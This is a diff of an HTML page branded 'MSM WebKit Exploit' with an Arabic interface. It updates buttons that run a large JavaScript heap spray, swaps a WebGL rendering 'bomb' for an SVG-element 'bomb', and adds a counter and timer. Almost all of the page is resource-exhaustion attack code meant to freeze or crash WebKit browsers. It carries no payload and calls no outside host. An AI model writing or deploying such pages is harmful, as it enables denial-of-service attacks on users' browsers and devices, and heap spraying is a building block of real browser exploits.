@@ -1,15 +1,15 @@
 <!DOCTYPE html>
 <html>
   <head>
-    <title>MSM WebKit Exploit v6.1</title>
+    <title>MSM WebKit Exploit v8</title>
     <meta charset="UTF-8" />
     <style>
       body {
-        background-color: #1a1a1a;
+        background-color: #121212;
         color: #00ccff;
         font-family: monospace;
         text-align: center;
-        padding-top: 60px;
+        padding-top: 50px;
       }
       button {
         padding: 14px 28px;
@@ -20,32 +20,36 @@
         cursor: pointer;
         margin: 10px;
       }
-      canvas {
+      #status, #timer, #counter {
         margin-top: 20px;
-        border: 2px solid #00ccff;
-      }
-      #status, #timer {
-        margin-top: 30px;
         font-size: 18px;
+      }
+      svg {
+        width: 0;
+        height: 0;
       }
     </style>
   </head>
   <body>
-    <h1>⚡ MSM WebKit Exploit v6.1 – ضغط مزدوج + مؤقت</h1>
+    <h1>⚡ MSM WebKit Exploit v8 – ضغط متكامل</h1>
     <button onclick="startHeap()">🔥 Heap Spray</button>
-    <button onclick="startWebGL()">🚀 WebGL Bomb</button>
+    <button onclick="startSVG()">💥 SVG Bomb</button>
     <p id="timer">⏱️ المؤقت: 0 ثانية</p>
-    <p id="status">جاهز للتفجير...</p>
-    <canvas id="glcanvas" width="512" height="512"></canvas>
+    <p id="counter">🔢 التكرارات: 0</p>
+    <p id="status">جاهز للتنفيذ...</p>
+    <svg id="svgbomb"></svg>
 
     <script>
       let seconds = 0;
       let timerInterval = null;
+      let counter = 0;
 
       function startTimer() {
         clearInterval(timerInterval);
         seconds = 0;
+        counter = 0;
         document.getElementById("timer").innerText = "⏱️ المؤقت: 0 ثانية";
+        document.getElementById("counter").innerText = "🔢 التكرارات: 0";
         timerInterval = setInterval(() => {
           seconds++;
           document.getElementById("timer").innerText = `⏱️ المؤقت: ${seconds} ثانية`;
@@ -60,88 +64,48 @@
         startTimer();
         const status = document.getElementById("status");
         status.innerText = "⏳ MSM: بدأ Heap Spray...";
-        let total = 0;
         try {
-          for (let i = 0; i < 150000; i++) {
-            let spray = new Uint32Array(8192);
+          for (let i = 0; i < 200000; i++) {
+            let spray = new Uint32Array(16384);
             spray.fill(i);
-            total += spray[0];
+            counter++;
+            if (i % 1000 === 0) {
+              document.getElementById("counter").innerText = `🔢 التكرارات: ${counter}`;
+            }
           }
-          status.innerText = `✅ MSM: Heap Spray اكتمل – راقب المتصفح!`;
+          status.innerText = "✅ MSM: انتهى Heap Spray بنجاح!";
           stopTimer();
         } catch (e) {
-          status.innerText = "💥 MSM: خطأ أثناء Heap Spray – احتمال خلل!";
+          status.innerText = "💥 MSM: خطأ أثناء Heap Spray!";
           stopTimer();
         }
       }
 
-      function startWebGL() {
+      function startSVG() {
         startTimer();
         const status = document.getElementById("status");
-        status.innerText = "⏳ MSM: بدأ WebGL Bomb...";
-        const canvas = document.getElementById("glcanvas");
-        const gl = canvas.getContext("webgl");
-
-        if (!gl) {
-          status.innerText = "❌ MSM: WebGL غير مدعوم!";
+        status.innerText = "⏳ MSM: بدأ SVG Bomb...";
+        const svg = document.getElementById("svgbomb");
+        try {
+          for (let i = 0; i < 10000; i++) {
+            let rect = document.createElementNS("http://www.w3.org/2000/svg", "rect");
+            rect.setAttribute("x", i);
+            rect.setAttribute("y", i);
+            rect.setAttribute("width", "1");
+            rect.setAttribute("height", "1");
+            rect.setAttribute("fill", "#00ccff");
+            svg.appendChild(rect);
+            counter++;
+            if (i % 500 === 0) {
+              document.getElementById("counter").innerText = `🔢 التكرارات: ${counter}`;
+            }
+          }
+          status.innerText = "✅ MSM: انتهى SVG Bomb بنجاح!";
           stopTimer();
-          return;
+        } catch (e) {
+          status.innerText = "💥 MSM: خطأ أثناء SVG Bomb!";
+          stopTimer();
         }
-
-        const vsSource = `
-          attribute vec4 a_position;
-          void main() {
-            gl_Position = a_position;
-          }
-        `;
-        const fsSource = `
-          precision highp float;
-          void main() {
-            float x = gl_FragCoord.x;
-            float y = gl_FragCoord.y;
-            float intensity = mod(x * y, 255.0) / 255.0;
-            gl_FragColor = vec4(intensity, 0.0, intensity, 1.0);
-          }
-        `;
-        function compile(type, source) {
-          const shader = gl.createShader(type);
-          gl.shaderSource(shader, source);
-          gl.compileShader(shader);
-          return shader;
-        }
-
-        const vs = compile(gl.VERTEX_SHADER, vsSource);
-        const fs = compile(gl.FRAGMENT_SHADER, fsSource);
-        const program = gl.createProgram();
-        gl.attachShader(program, vs);
-        gl.attachShader(program, fs);
-        gl.linkProgram(program);
-        gl.useProgram(program);
-
-        const buffer = gl.createBuffer();
-        gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
-        gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([
-          -1, -1, 1, -1, -1, 1,
-          -1, 1, 1, -1, 1, 1
-        ]), gl.STATIC_DRAW);
-
-        const loc = gl.getAttribLocation(program, "a_position");
-        gl.enableVertexAttribArray(loc);
-        gl.vertexAttribPointer(loc, 2, gl.FLOAT, false, 0, 0);
-
-        let frames = 0;
-        function render() {
-          gl.drawArrays(gl.TRIANGLES, 0, 6);
-          frames++;
-          if (frames < 600) {
-            requestAnimationFrame(render);
-          } else {
-            status.innerText = "✅ MSM: WebGL Bomb اكتملت – راقب الأداء!";
-            stopTimer();
-          }
-        }
-
-        render();
       }
     </script>
   </body>
